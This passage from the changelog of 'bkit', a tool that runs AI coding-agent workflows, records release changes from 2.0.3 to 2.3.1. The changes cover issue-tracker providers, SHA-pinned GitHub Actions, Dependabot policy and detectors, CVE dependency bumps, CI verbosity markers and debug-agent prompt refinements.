- **Docs updated:** `security.md` KN-3 § Supply-Chain pairs SHA-pinning with Renovate (drops the default-branch-only and `automated-security-fixes` Dependabot footguns); `deployments.md` KN-3 paragraph + `bkit-ci-router` exemption rewritten around `packageRules` instead of "Dependabot has no per-file scoping"; `knowledge.md` KN-3 references Renovate; `.agents/README.md` tier table + dogfood section updated; `README.md` advisory-ID table updated.

---

## [2.3.1] — 2026-05-23

### Added

- **`docs/bkit-comparison.md` — human-facing pipeline reference + Agentic Design Patterns comparison.** Documents the five-phase pipeline and every subagent it runs (in execution order), and maps bkit against the 22 patterns in Antonio Gulli's _Agentic Design Patterns_ (12 fully implemented, several beyond the book). For evaluation, onboarding, and outreach — bkit-repo-specific, not seeded to consumers.

### Changed

- **README "Why bkit" section.** New top-of-README narrative covering parallel-by-design (worktree isolation), tracker integration (GitHub Issues / Linear), and team consistency (Claude Code + Cursor). Points at `docs/bkit-comparison.md` for the full pipeline + subagent reference.

---

## [2.3.0] — 2026-05-22

### Added

- **Tracker pluggability — github / linear / none provider abstraction. (issue [#39](https://github.com/cbartens/bkit/issues/39), PR [#120](https://github.com/cbartens/bkit/pull/120))** Workflows carry `<!-- bkit:tracker {id} start --> ... end -->` marker pairs at every tracker call site; `bkit install --tracker=<github|linear|none>` writes `bkit.issueTracker` to consumer manifest, merges `mcpServers.<name>` into `.mcp.json` (+ Cursor variant), and substitutes provider snippets into mirror output (zero markers in `.claude/commands/*` / `.cursor/commands/*`). Three providers ship: `github` (default — `mcp__github__issue_*` / `add_issue_comment`), `linear` (opt-in — `mcp__linear__save_*` / `get_issue`), `none` (no-tracker stub). Substitution counts verified across all 6 workflows × 3 trackers (build 31, design 23, plan 19, ship 21, debug 23, ci-router 9). **Uniform new-comment-per-step semantics** across providers — Linear loses edit-in-place rule for parity with GitHub-MCP capabilities. **Label vocabulary** rewritten to `bkit:design|plan|build|debug|ship|merged` (phase, mutually exclusive) + `bkit:auto|failed|debug` (additive). **AGENTS.md cross-host router** accepts `#NNN`, `[A-Z]+-\d+`, and bare `\d+` issue-ID patterns. **PR body metadata marker** `<!-- bkit:issue=#NNN bkit:fid=NNN-slug bkit:auto -->` resolves issue ID for downstream workflows. Foundational mechanism only; CI-router double-gate runtime + Cursor cloud dispatch docs + dogfood cycle land in follow-on issues.
- **`bkit ` attribution prefix on bkit-emitted commit markers.** bkit-authored commits now prepend `bkit ` to `[skip ci]` / `[verbose ci]` / `[force build|cache|e2e]` / `[skip build]` for human-readable provenance (e.g. `bkit [skip ci]`, `bkit [verbose ci]`). Marker semantics unchanged — `ci.yml` and downstream check sites match the bare substring (`[skip ci]`), so both bkit-emitted and user-typed markers trigger.

### Fixed

- **Marker CHECK sites match bare substring, not `bkit ` prefix.** `.agents/templates/.github/workflows/ci.yml` `contains()` env-block + `case` direct-push detect now look for bare `[verbose ci]` / `[force cache]` / `[force build]` / `[force e2e]` substrings — fixes the regression where user-typed bare markers no-op'd because the check tightened to `bkit [...]`. Workflow CHECK sites in `.agents/workflows/bkit-debug.md` (PR-title idempotency `case` checks + Step 12 strip sed consumes optional `bkit ` prefix) and `.agents/workflows/bkit-build.md` (HEAD `[force build]` presence check) follow the same rule. bkit-emitted commits keep `bkit ` attribution prefix — substring match honours both forms.

### Changed

- **`docs/plans/` layout collapsed to single `{YYYYMM}/` bucket — no more `drafts/` / `active/` / `completed/`. (issue #110)** Plans and designs live at `docs/plans/{YYYYMM}/{FID}-{plan,design}.md` for their full lifetime; logs at `docs/plans/{YYYYMM}/logs/{FID}/`. `{YYYYMM}` = creation month, set once at design start (`date +%Y%m`) and discovered by downstream workflows via `ls -d docs/plans/[0-9][0-9][0-9][0-9][0-9][0-9]/logs/{FID}/`. Files never move — fixes the dead-link problem where every workflow-posted issue/PR comment 404'd after ship's `mv active → completed` step and feature-branch deletion. Workflow state (`draft` / `active` / `completed`) moves from directory layout to `status.json`. All comment URLs for canonical artifacts switch to `blob/main/docs/plans/{YYYYMM}/{FID}-*.md` (survives branch deletion); log links remain `blob/{BRANCH}/...` as best-effort (logs are delete-eligible). bkit's own historical `docs/plans/{drafts,active,completed}/` and `docs/plans/logs/` are migrated in this release via `git mv` to preserve blame. **Consumer-side retrofix:** per-consumer runbook posted on issue [#110](https://github.com/cbartens/bkit/issues/110) (and cross-posted on [#39](https://github.com/cbartens/bkit/issues/39)) — copy-paste once into a Claude Code session in each consumer repo after upgrading.
- **SHA-pinned all `uses:` lines across `.github/workflows/` and `.agents/templates/.github/workflows/`.** Replaces floating `@v4` / `@v1` tags with 40-char commit SHAs and `# vX.Y.Z` comments — closes the long-standing `gha-actions-floating-tags` advisory in bkit's own dogfood. Affects `actions/checkout` (v4.3.1), `actions/setup-node` (v4.4.0), `pnpm/action-setup` (v4.4.0), and `anthropics/claude-code-action` (v1.0.99). Going forward, Dependabot version updates will refresh these pins on each upstream release; the bkit-repo-specific template-sync dance is documented in `.agents/README.md` § "bkit-repo dogfood rule".

### Security

- **CVE fixes via dependency bumps.** Bumped `vitest` `^2.1.0` → `^4.1.7` and added direct `vite` `^6.4.2` devDep + `pnpm.overrides` to force CVE-fixed transitives: closes GHSA-4w7w-66w2-5vf9 (vite path traversal in optimized-deps .map handling, CVE-2026-39365) and the esbuild dev-server-request CVE. Both were transitive dev-only deps coming through `vitest@2.x → vite@5.x → esbuild@0.21.x`. Side benefit: `vitest 4` adoption brings the new test runner to bkit's own suite (934 tests pass, no regressions). Snapshot-format compatibility preserved.

### Added

- **Dependabot config shipped as Tier 3.** `bkit install --ci` (or `bkit install` no-flags) now seeds `.github/dependabot.yml` (seed-or-print) alongside `.github/workflows/ci.yml`. Template at `.agents/templates/.github/dependabot.yml` ships the `github-actions` ecosystem with `target-branch: dev` (mandatory for bkit branch-protection — Dependabot PRs without it hit `main` and are rejected), `commit-message.prefix: "chore(deps)"`, weekly schedule, `open-pull-requests-limit: 10`, and `groups:` to bundle per-ecosystem PRs. `npm` ecosystem is shipped commented-out as opt-in. Existing consumer `.github/dependabot.yml` triggers `tier3-merge-suggested-dependabot.yml` advisory with AI-paste-ready merge instructions.
- **Repo-level Dependabot policy helper.** New `scripts/ci/bkit-set-dependabot.sh` (template at `.agents/templates/scripts/ci/bkit-set-dependabot.sh`) — one-shot, idempotent applier for the bkit-canonical Dependabot policy. Two actions: PUT `vulnerability-alerts` (enable — required for `.github/dependabot.yml` to be read at all) AND DELETE `automated-security-fixes` (defensive disable — bkit policy: never auto-PR to `main`, because that feature routes CVE PRs to the default branch which bkit branch protection rejects from non-`dev` sources). Supports `--dry-run` and `--print`. CVE handling stays manual via the repo Security tab.
- **Four new Phase 3 detectors.** `dependabot-target-branch-missing` fires when `.github/dependabot.yml` has `updates[]` entries but no `target-branch: dev` anywhere — silent-breakage prevention against the main-branch protection contract. `dependabot-config-invalid` fires on missing `version: 2`, missing `updates:`, or tab indentation. `dependabot-repo-prereqs-disabled` fires when the config exists but `vulnerability-alerts` is disabled at the repo level (probes via `gh api`; silent-skip if `gh` unavailable to avoid false positives). `dependabot-auto-security-fixes-enabled` fires when `automated-security-fixes` is ON — policy violation under the never-auto-on-main rule. All wired into `runPostInstallCheck`.
- **bkit repo dogfoods its own template.** `.github/dependabot.yml` added at bkit repo root; npm ecosystem deliberately omitted for v1 (low breaking-change tolerance on tooling deps — revisit if manual upgrade cadence becomes painful). GitHub issue #109 tracks the decision and acceptance criteria.

### Changed

- **`detectDependabotConfigMissing` advisory rewritten.** No longer embeds a snippet inline; points consumers at `pnpm bkit install --ci` AND the new `scripts/ci/bkit-set-dependabot.sh` helper for the repo-level prereqs step. Single source of truth for snippet shape is `.agents/templates/.github/dependabot.yml`. Eliminates parallel-copy drift between detector, `docs/security.md`, and the template.
- **`DEPENDABOT_YML_MERGE_INSTRUCTIONS` extended.** AI-paste-ready merge advisory now has four required actions (target-branch, commit-message prefix, default-branch propagation, run prereqs script — which enables alerts AND disables auto-security-fixes per bkit policy) rather than three. Aligns with the silent-breakage failure modes AND the never-auto-on-main policy encountered in the #109 rollout.
- **`docs/security.md` § Supply-Chain (GitHub Actions) updated.** Snippet now matches the shipped template (`target-branch: dev`, `chore(deps)` prefix). New callouts: (a) must-be-on-default-branch — GitHub reads the config ONLY from the default branch; (b) must-enable-vulnerability-alerts via the helper script; (c) **never-auto-on-main policy** — `automated-security-fixes` stays DISABLED, CVE handling stays manual via the Security tab. Notes that `bkit-ci-router` does not dispatch on Dependabot PRs by design. Mirror in `.agents/templates/docs/security.md`.
- **`docs/deployments.md` § GitHub Actions pinning pointer.** Updated to mention `target-branch: dev`, the default-branch propagation rule, AND the prereqs script; mirror in `.agents/templates/docs/deployments.md`.
- **README advisory IDs table.** Adds the five dependabot entries (`dependabot-config-missing`, `dependabot-target-branch-missing`, `dependabot-config-invalid`, `dependabot-repo-prereqs-disabled`, `dependabot-auto-security-fixes-enabled`).

---

## [2.2.3] — 2026-05-19

### Changed

- **`bkit check` now runs Phase 3 detectors for parity with `bkit install`.** Previously, `check` returned only Phase 1 preflight + Phase 2 module-dispatched advisories, masking runtime-state findings (`gh-bkit-token-unset-shell`, `npmrc-missing-gh-packages`, `ci-yml-missing-token-env`, `gha-actions-floating-tags`, `dependabot-config-missing`, `cloud-secrets-three-locations`, etc.) that only `install` would surface. Both commands now produce the identical advisory set against the same filesystem state — `check` is `install` minus the writes. CI drift gate semantics preserved: `bkit check` still exits 1 when any Tier-1/Tier-2 write would occur. The `dryRun` parameter on `runPostInstallCheck` is removed (was effectively dead code after this change).

---

## [2.2.2] — 2026-05-19

### Changed

- **Docs/config housekeeping.** `docs/deployments.md` documents the org/repo Workflow permissions setting required for `bkit-ci-router` (BAR-148). Subagent model pins swapped from `composer-2` to `composer-2.5` across Cursor configs. Autonomous workflow `CAUTION` blocks gain the Narrate invariant (BAR-229). `friction.md` entries captured by BAR-155 + BAR-230 pruned.

---

## [2.2.1] — 2026-05-18

### Added

- **`.agents/advisories.md` persistent artifact (preflight + post-install).** `bkit install` / `check` / `doctor` now write the most-recent preflight + post-install checklist to `.agents/advisories.md` so consumers can revisit findings between runs. Overwritten on every run; clean runs write a "no advisories" stub. New `bkit-postinstall.ts` module owns the rendering. Added to the bkit-managed `.gitignore` block (transient artifact, not committed).
- **README quick-install block.** Paste-ready installer prompt walks an AI through PAT setup + `.npmrc` configuration + initial `bkit install`. Lowers the barrier for first-time consumers.
- **GitHub Actions supply-chain pinning guide.** New `docs/security.md` § "Supply-Chain (GitHub Actions)" (also in template) — recommends SHA-pinning `uses:` lines and pairing with Dependabot for auto-bumps. `docs/deployments.md` gains a pointer to the new section.

---

## [2.2.0] — 2026-05-18

### Added

- **`[verbose ci]` commit-message / PR-title marker (BAR-224).** Opt-in max-detail CI logging — append `[verbose ci]` to a commit message or PR title to escalate one CI run. Lean knob set: `TURBO_LOG_LEVEL=full`, `NODE_OPTIONS=--trace-warnings --trace-deprecation`, `DEBUG=vercel:*,supabase:*`, plus Playwright `--trace=on` (when E2E stub enabled — `--video` and `--screenshot` are `playwright.config.ts use:` keys, NOT CLI flags; trace.zip covers their use case). Composes with `[force build]` / `[force cache]` in any order. Template ships:
  - `bkit:start verbose-ci-env` named env block at `jobs.run-tests:` level in `.agents/templates/.github/workflows/ci.yml`.
  - `Configure Verbose CI` step propagating verbose envs via `$GITHUB_ENV` (visible activation echo in CI logs).
  - Verbose-aware Playwright stub commentary — never pass `--reporter=line`, conditionally append trace/video/screenshot.
  - Canonical marker row in `.agents/templates/docs/deployments.md` § "Commit-message force tags" alongside `[force build]` / `[force cache]` / `[skip ci]`, including the explicit PR-title-vs-commit-message rule (push events read `head_commit.message`; pull_request events read `pull_request.title` — feature-branch pushes only fire pull_request, so the marker MUST go in the PR title there).
  - Testing-specific reference in `.agents/templates/docs/testing.md` § "CI verbosity" covering the knob list, when-to-use, hostile `--reporter=line` gap, and gitignore'd artifact paths.
- **Playwright artifact gitignore guardrail (BAR-224).** `.agents/templates/gitignore` now ignores `test-results/`, `playwright-report/`, `blob-report/`, `.last-run.json`, and `playwright/.auth/` inside the bkit-managed block. Prevents accidental commit of trace/video binaries (1-50MB each) under `[verbose ci]`, and protects the auth-state directory which contains live session tokens.
- **Cancel-resilient Playwright artifact upload (BAR-224).** `bkit-stub:e2e-artifacts` upload condition changed from `if: failure() && steps.e2e.conclusion == 'failure'` to `if: always()`. The HTML reporter only finalises `playwright-report/index.html` at suite `onEnd`; on job-timeout SIGTERM that file is never written. But per-test `trace.zip` files in `test-results/` write incrementally and survive mid-suite cancel. Previous condition skipped uploads on cancel (cancel ≠ failure in GH Actions), losing all traces. `if: always()` captures both failure and cancel paths.
- **Two new `bkit install` advisories (BAR-224).**
  - `ci-yml-verbose-ci-block-missing` — fires when consumer's ci.yml has bkit markers but is missing the new `bkit:start verbose-ci-env` block; directs to `pnpm bkit install`.
  - `playwright-reporter-line-override-hostile` — fires when a `playwright test` invocation passes `--reporter=line`, which silently overrides the configured reporter chain and causes verbose traces to be written but never surfaced.
- **`bkit-debug` orchestrator wires `[verbose ci]` on every CI-triggering push (BAR-224).** Debug mode is failure-recovery by definition — verbose is the right default, not a retry escalation. Two surfaces wired:
  - **Local mode (`DEBUG_MODE = local`, debug on dev/main push):** every commit-message in `.agents/workflows/bkit-debug.md` that does not carry `[skip ci]` gets `[verbose ci]` appended conditionally via `VERBOSE_SUFFIX=""; [ "$DEBUG_MODE" = "local" ] && VERBOSE_SUFFIX=" [verbose ci]"` (5 sites: failure-remediate fix, summary, observe-instrument, close-workflow, create-pr). `push.head_commit.message` reads the marker → CI runs verbose. PR-mode runs skip the suffix entirely so commit history stays clean (no `[verbose ci]` clutter in commit subjects or squash bodies).
  - **PR mode (`DEBUG_MODE = pr`, debug on feature-branch + open PR):** Step 7 sub-step 2a (off-mode push path) and Step 9 sub-step 4a (instrument-mode push path) set `[verbose ci]` in the PR title immediately before their push — set co-located with the push that needs it. Step 12 sub-step 1a strips it **only when `OBSERVE_MODE = off`** (successful remediation close). `pull_request.synchronize` events read `pull_request.title` (the `push` event does not fire for non-`main`/`dev` branches), so the title is the only surface that works for PR-mode CI. **`OBSERVE_MODE = instrument` close + analyse handover + Failure Path all intentionally preserve the marker** so the next consumer (analyse cycle, observe-revert push, post-handover human investigator) keeps getting verbose CI without manual re-adding.
  - `bkit-build.md` intentionally not wired — build's pushes are happy-path by definition; verbose is contraindicated on shippable commits. The build→debug handoff (when build's Failure Path triggers a debug cycle) is where verbose kicks in automatically via the rules above.
- **`bkit-debug` rot-signal hint via diagnose → summary / handover (BAR-219).** `bkit-debug-failure-diagnose` emits a `## Rot Signals` body section listing applicable lens slugs (subset of `architecture, hotpath, config, reliability, observability, debt, dead-code, deps, security, tests, docs-drift`) with one-line evidence per match when stack trace / root-cause analysis surfaces structural rot on-path. `bkit-debug-summary` + `bkit-debug-abort-handover` aggregate across diagnose attempts (dedupe slugs, retain all evidence) so the signal reaches humans regardless of debug-cycle outcome. Summary `Verdict` semantically extended — `CONCERNS` now covers rot-detected cases alongside the original "ambiguous root cause" meaning.
- **`bkit-debug-failure-diagnose` minimum-bundle hardening (BAR-198).** Four BAR-197-class failure modes retrofitted onto diagnose; remediate keeps its existing "loyal soldier" contract:
  - **Scar-tissue scan (A)** — Step 7 finds reverted commits with candidate files → `Prior Knowledge`. Catches lessons rolled back from code that never reached `docs/knowledge.md` (the BAR-166 / BAR-192 re-application gap).
  - **Blast Radius check (B)** — Step 14 enumerates affected surfaces when `Recommended Remediation` effects propagate beyond named files (loaders, schemas, public contracts, shared utilities, config globals, middleware, routing); unhandled break → `Verdict` = FAIL.
  - **Scope-split (C)** — Step 12 routes recommendations to either `Recommended Remediation` (in-scope, remediate applies) or `Out-of-Scope Recommendations` (deferred for human triage). `bkit-debug-summary` + `bkit-debug-abort-handover` aggregate the out-of-scope section across diagnose attempts.
  - **PIVOT / FINAL re-application check (F)** — Step 5 strategy clauses demand explicit answering: "Is this a re-application of prior commit SHA / debug log? What new evidence makes it work this time?" Anti-recurrence check (Step 13) provides the reactive backstop catching recommendations that resemble reverted attempts.
- **`/bkit-debug` Step 3 Context fetch refactor (BAR-198).** Workflow Step 3 renamed "Fetch Logs" → "Fetch Context"; expanded from 3 to 5 sub-fetches in priority order, with all deterministic data-gathering moved out of diagnose:
  - `debug-context-ci-{ATTEMPT}.md` — CI logs (`gh run view --log-failed`).
  - `debug-context-diff-{ATTEMPT}.md` — diff vs last-passing CI on `dev` (`gh run list --workflow ci.yml --status success` → `git diff <last-pass-sha>..HEAD --stat`). Filter pins to `ci.yml` so an unrelated workflow's success doesn't define the diff baseline.
  - `debug-context-tests-local-{ATTEMPT}.md` — `pnpm turbo lint typecheck test --filter='...[origin/dev]' --continue` stdout/stderr.
  - `debug-context-tests-e2e-{ATTEMPT}.md` — Playwright artifact (`gh run download -n playwright-report`).
  - `debug-context-runtime-{ATTEMPT}.md` — runtime fetch template from `docs/observability.md` (BAR-194 mechanism, now under the unified naming).

  Diagnose reads pre-staged context as supplied input; signal-weight hints inline ("local-test output = primary signal", "diff vs last-passing CI = scope-narrowing signal"). Workflow status step renamed `debug-fetch-logs` → `debug-fetch-context`. All references in `.agents/workflows.md`, `.agents/prompts.md`, `.agents/templates/docs/observability.md`, `docs/observability.md` updated.

### Changed

- **Cross-prompt output body description style normalised (BAR-198 / BAR-219).** Body section instructions across debug + audit / build / design / plan / ship summary prompts unified to "If X then \`Y\`" pattern (e.g. `If no rot signals then None`). Grammar fix `"NEVER assumed outcomes or infer results"` → `"NEVER assume outcomes or infer results"` across 6 summary prompts.
- **`.agents/rules.md` adds "End-state over diff-size" principle.** AI makes changes cheap — never pick solutions based on lower cost-of-change; always pick the solution with best quality-of-end-state. Sits alongside "Completeness over shortcuts" in § Principles.
- **`scripts/secrets/sync-github.sh` strips `GH_TOKEN` from gh env.** New `gh_clean()` wrapper drops the env var so the auth-login session takes precedence over a sourced fine-grained PAT that would otherwise 403 on `actions/secrets/public-key`. Plus `printf '%s'` over `echo -n` for portable secret value writes.

### Fixed

- **README.md historical-commentary cleanup.** Dropped `"(was only required for git-dep model)"` parenthetical and rephrased the `"Removed in v0.4.0 (breaking)"` block as forward-looking `"Upgrading from v0.3.x"` instruction. Historical context belongs here (CHANGELOG.md), not README.
- **`docs/architecture.md` historical-commentary cleanup.** Dropped `"bkit-tier1-defaults.ts DELETED (v2.0.0) — sole consumer migrateTier1JsonToTier2 removed"` comment from the `.agents/scripts/` tree (already in this file's v2.0.0 entry + `docs/decisions.md`). Dropped the trailing `(v2.0.0+)` annotation on `bkit-tiers.ts` description.

---

## [2.1.0] — 2026-05-14

### Added

- **`/bkit-ci-router` slash command + GHA plumbing (BAR-148).** New auto-dispatch router (`.claude/agents/bkit-ci-router.md`, `.github/workflows/bkit-ci-router.yml`) that picks ship vs debug after each phase completes and writes its decision to `docs/plans/logs/{FID}/status.json`. Tier-1 auto-mirror keeps `.claude/` and `.cursor/` copies in sync; Skill→Task T2 transform routes consumer Cursor work through Background Agents. PR_URL/RUN_ID extraction, close-on-SKIP, canonical CAUTION block, BAR-187-compliant per-step commits, `in`/`not in` membership, enum-value backticking per `workflows.md` authoring rules.
- **Cloud env recipe for Claude Code on the web + Cursor Background Agents (BAR-191).** `.agents/cloud.md` ships as canonical doc covering both providers. `bkit install` seeds `.claude/hooks/cloud-bootstrap.sh` (Tier-3 seed-or-print) and emits `cloud-env-customize` advisory pointing consumers at the customization seam. Cursor side ships Tier-2 markered `.cursor/Dockerfile` + `.cursor/hooks/cloud-bootstrap.sh` aligned to the Claude env. Docs spell out in-repo dispatch vs online-dashboard split so consumers pick the right entry point.
- **`/bkit-debug` Step 3 fetch-logs (BAR-194).** Diagnosis now fetches relevant GCP log lines via `<debug-fetch>` markers in `docs/observability.md` before forming hypotheses, so root-cause analysis runs on runtime evidence, not code reading. Consumers add markers per service; bkit fetches and inlines log snippets into the diagnose payload.
- **`bkit install` advisory expansion — 8 new detectors (BAR-195).** New advisories cover Tier-1 #7 concurrency drift, Tier-2 marker stubs without bodies, Tier-3 docs/script mismatch, plus wording cleanups across the existing advisory set. Catches more pre-flight drift before it becomes a CI failure.
- **`pnpm test:integration` direct turbo dispatch (BAR-195).** `pnpm test:integration` now runs `turbo run test:integration --continue` directly (previously routed through a missing wrapper script that silently no-op'd). Missing-script detector warns consumers whose `package.json` lacks the script. Dev-rollback runbook added; KN-25 captures the silent-skip incident.
- **`scripts/sync-github.sh` for managing GitHub Actions secrets (BAR-195).** One-shot `bash scripts/sync-github.sh` reads `.env` and applies via `gh secret set --env-file`, replacing the manual per-secret `gh secret set` dance. Bkit-repo-only; not shipped to consumers.
- **Done-when enforcement gates across plan + build agents (BAR-168).** `Done when:` criterion per plan task — introduced advisory in 2.0.5, now enforced by `bkit-plan-review-1/2/3`, `bkit-plan-scope-check-1/2`, and `bkit-plan-verify`. Missing or vacuous Done-when fails the gate. Build-time verification matches the criterion against the Derived Test Matrix.

### Changed

- **Prompt authoring rules — sweeping alignment (BAR-193).** All agent prompts revised: verbose process steps compressed, contract clauses tightened, role-differentiation across parallel siblings (`design-review-1` vs `-2`, `brainstorm-ideate-1/2/3`, `plan-review-1/2/3`, `plan-scope-check-1/2`, `build-challenge-1/2`) so each sibling produces a distinct angle instead of redundant output. Workflow hygiene fixes: canonical Comments rule, fresh-comment discipline, save_comment as last sub-step before gate. `.claude/`/`.cursor/` mirrors regenerated; Models table rows updated.
- **Bkit-shipped scripts renamed `bkit-*` and moved to `scripts/ci/` (BAR-195).** `scripts/bkit-set-protection.sh` replaces the prior loose script layout; `scripts/rollback-main.sh` removed (subsumed by the dev-rollback runbook + `bkit-set-protection.sh`). Prefix makes it obvious to consumers which scripts are bkit-managed Tier-3 templates vs their own. `deployments.md` tables wrapped with `<!-- prettier-ignore -->` for the new column widths.
- **`turbo --continue` widened to build paths (BAR-195).** Build pipeline no longer aborts on first failure — partial failures surface together so a single CI run pinpoints all regressions instead of one-at-a-time whack-a-mole.
- **Bkit-ci-router workflow compliance pass (BAR-148).** Per-step commit pattern aligned to BAR-187 (parentSha captured at step start, file-only writes between steps, single dev commit at Close Workflow). Step 4 (Append Decision) merged into Step 5 (Dispatch); DECISION variable dropped in favour of direct status.json read.

### Fixed

- **`.agents/cloud.md` missing from CANONICAL_OVERWRITE_RELPATHS (BAR-191).** First cut of the cloud doc shipped as Tier-2-style but the file wasn't in the canonical overwrite list, so consumer drift wouldn't trigger reconcile. Added to `CANONICAL_OVERWRITE_RELPATHS` in `bkit-modules.ts`; install now overwrites on every run.

### Docs

- **`.agents/` + `docs/` index files audited and resynced.** Top-level `.agents/docs.md`, `.agents/skills.md`, `.agents/prompts.md`, `.agents/workflows.md`, and `docs/dispatch.md` rewritten against current file state — entries for removed files dropped, new files added, descriptions tightened. Eliminates the staleness that's been accreting since 2.0.4.

---

## [2.0.6] — 2026-05-12

### Changed

- **Pre-worktree commit hygiene (BAR-190).** `bkit-{ship,design,plan,build}` Step 2.1 pre-worktree commit now always carries `[skip build] [skip ci]`. `bkit-ship` Step 2.1 staging tightened to an allow-list (`docs/`, `.agents/friction.md`) matching the design/plan/build 1.1.2 fix. Step 7 Switch-to-Dev tolerates `AHEAD>0` when every ahead commit is `[skip ci]`-tagged (rebase + silent push); non-skip-ci ahead commits still route to Failure Path. Step 11 Close Workflow adds a detection guard that looks up the squash-merge SHA's CI run and fails to Failure Path if the run was cancelled or its `test*` job was skipped; Gate 11 documents the check.
- **Worktree-safe repo-root resolution (BAR-155).** All 5 phase workflows and `.agents/workflows.md` replace `$(git rev-parse --show-toplevel)` with `$(dirname "$(git rev-parse --path-format=absolute --git-common-dir)")` so orchestrators whose cwd is already inside a worktree don't double-nest `.worktrees/`. `bkit-ship` Step 4 wraps `gh pr merge` in a `cd "$(dirname …)"` subshell so `--delete-branch` stops failing with `fatal: 'dev' is already used by worktree`.
- **Cross-workflow rebase alignment (BAR-155).** `--rebase-merges` ported from `bkit-ship` to `bkit-{debug,build,design,plan}` Step 2 worktree-resume `git rebase origin/dev`, per the Workflow Authoring Rules.

### Fixed

- **Vale self-trigger on compress-markdown prompt (BAR-189).** `bkit-utility-compress-markdown.md` enumerates hedging/verbose phrases verbatim as examples to strip, so `House.Hedging` and `House.Verbose` self-fired on every consumer running `pnpm lint:prose`. Adds a scoped exemption (mirrors the existing `skills/` pattern) in both the bkit `.vale.ini` and the `templates/.vale.ini` shipped to consumers.

### Docs

- **README upgrade callout — pnpm 10 manifest narrowing (KN-22).** `pnpm update @cbartens/bkit` on pnpm 10 silently rewrites `package.json` from `"^2"` to the resolved exact minor (e.g. `"^2.0.5"`) and pins the lockfile specifier to match. README now documents the check-and-restore sequence (`grep '"@cbartens/bkit"' package.json` → if narrowed, edit back to `"^2"` and `pnpm install --frozen-lockfile=false`). KN-22 captures the root cause for future reference.

---

## [2.0.5] — 2026-05-12

### Added

- **PR-base gates (BAR-170).** `bkit-build` Step 17 asserts `gh pr view --json baseRefName` = `dev` after PR creation; `bkit-ship` Step 2 reads `baseRefName` upfront and routes wrong-base to Failure Path. Prevents the BAR-95-class incident where a `feat/*` PR landed directly on `main`. Install-time advisory `main-branch-protection-missing` surfaces when `main` has no branch protection.
- **Rollback runbook (BAR-170).** `docs/deployments.md` ships a one-shot `bash scripts/rollback-main.sh <green-sha>` automating the GitHub protection save → disable → ref-reset → restore dance, plus a manual 5-step playbook fallback. `CORE_TEMPLATE_DIRS` extended with `scripts` so utility scripts propagate to consumers.
- **CI SHA-cache skip (BAR-170).** Pre-test step queries `gh run list` for prior green runs on the same SHA within 7 days; if found, all subsequent steps skip via per-step `if:` gating. Saves 10–20 min on rollback re-runs without disturbing required status checks.
- **Revert-branch pre-push bypass (BAR-170).** `.husky/pre-push` template detects `revert-*` branches or `Revert "*"` HEAD commits and downgrades to typecheck + format:check (test suite skipped), so recovery pushes can land when the source state is transitionally inconsistent.
- **ReAct `## Hypotheses` blocks (BAR-168).** Append-only ReAct sections added to `debug-failure-diagnose` and `debug-observe-analyse` outputs (`### Hypothesis {N} / #### Reason / #### Act / #### Observe / #### Result`). Refuted entries retained for future grep. `Result` enum: `CONFIRMED | REFUTED | INCONCLUSIVE | PENDING`.
- **`## Prior Knowledge` section in diagnose output (BAR-168).** Agent must cite matched `docs/knowledge.md` KN-N entries (or "No issues found.") — proves the agent used what the workflow matrix already mandates reading.
- **`**Done when:**` line per plan task (BAR-168 stage 1).** `bkit-plan-generate` mandates a Done-when criterion derived from the Derived Test Matrix where applicable. Enforcement gates (review / scope-check / verify) deferred.
- **Debug close-workflow opens PR when none exists (BAR-188).** When `/bkit-build` fails its summary gate no PR opens against `dev`, so subsequent `/bkit-debug` remediation pushes never trigger CI (feature branches are excluded from consumer workflow `push:` triggers). Step 11 now derives `TRIGGER_PR` via a three-way check: dev/main → push fires CI; feature + PR exists → push fires `pull_request`; feature + no PR (`DEBUG_MODE=local`) → `gh pr create --base dev`.

### Changed

- **Workflow commit/push count halved (BAR-187).** Per-step double-commit pattern (work + status) collapsed via `parentSha` captured at step START instead of post-commit `commitSha`. `Step.commitSha` → `Step.parentSha` in `.agents/scripts/bkit-status.ts`. Per-step writes are file-only between steps (uncommitted on dev); dev commit + push happens exactly once per run, at Close Workflow or Failure Path with `[skip ci]` on status-only commits. plan/design success uses `git merge --squash feat/{FID}` → one `docs({FID}): {phase} DONE` commit on dev. Ship close batches Steps 7-10 into a single `docs({FID}): ship DONE [skip ci]` commit.
- **`status.json` canonical location unified (BAR-187).** All five workflows now write to `$REPO_ROOT/docs/plans/logs/{FID}/status.json` (BAR-183 generalized from plan/design to build/debug/ship). Outside-worktree progress is readable via `cat` without entering the worktree or running `git show`.
- **`Failed` Linear label cleared on recovery (workflows).** `/bkit-debug` Step 1 and `/bkit-ship` Step 11 drop the `Failed` label if present, so a recovered or shipped issue does not carry a stale Failure Path marker. Failure Paths still re-add `Failed` on a new failure. Bundled tightening: every workflow's Failure Path note reworded from "additive — phase label persists" to "prior phase label persists".
- **Top-level docs and `.agents/` prose compressed.** Dense rewrites with explicit `<!-- prettier-ignore -->` markers around width-sensitive blocks. No semantic change.

---

## [2.0.4] — 2026-05-12

### Changed

- **`.husky/pre-commit` and `.husky/pre-push` migrated from Tier 2 (managed-block enforced) → Tier 3 (seed-or-print).** The `tier2-text-drift` gate failed `bkit check` in CI whenever a consumer customised the bkit-managed block, forcing them either back to the canonical content or to delete the block (which the next install would re-seed — there was no stable opt-out). The new tier ships the hook as a full-file template (no `bkit:start/bkit:end` markers): bkit seeds the canonical hook for new consumers and emits a `tier3-merge-suggested-pre-{commit,push}` advisory when one already exists, never enforcing drift. Declarative pattern files (`.gitignore`, `.prettierignore`) stay Tier 2 because their semantics genuinely require additive merging; imperative hook scripts don't. Migration is non-destructive — existing consumers with the legacy marker-block format keep their file unchanged on next install, get the advisory, can choose to migrate or ignore. **Manifest format flipped `markered-text` → `byte-equal-text`** for both husky paths; `bkit uninstall` now hash-guards deletion (preserves consumer-modified hooks rather than stripping a block). **Removed detectors:** `detectHuskyNoMarkers` and `detectHuskyBlockDuplicates` (and their `husky-no-markers-*` / `husky-block-duplicates-*` advisory IDs) — both keyed to the obsolete Tier-2 managed-block design.

---

## [2.0.3] — 2026-05-12

### Added

- **`utility-new-release` agent prompt** (`.claude/agents/utility-new-release.md` + `.agents/templates/`) — codifies the dev → main → tag → publish flow so future cuts avoid the KN-20 silent-skip trap (explicit scrubbed squash body, post-tag Release-workflow verification).
- **`lint-staged` adoption** — bkit pre-commit hook (consumer template + bkit-repo) now runs `pnpm lint-staged` so staged files are formatted via `prettier --write` at commit time. Pre-push keeps `pnpm format:check` as the safety net for hook-bypass cases (--no-verify, GitHub web edits, stale local config). Matches gether's pattern.
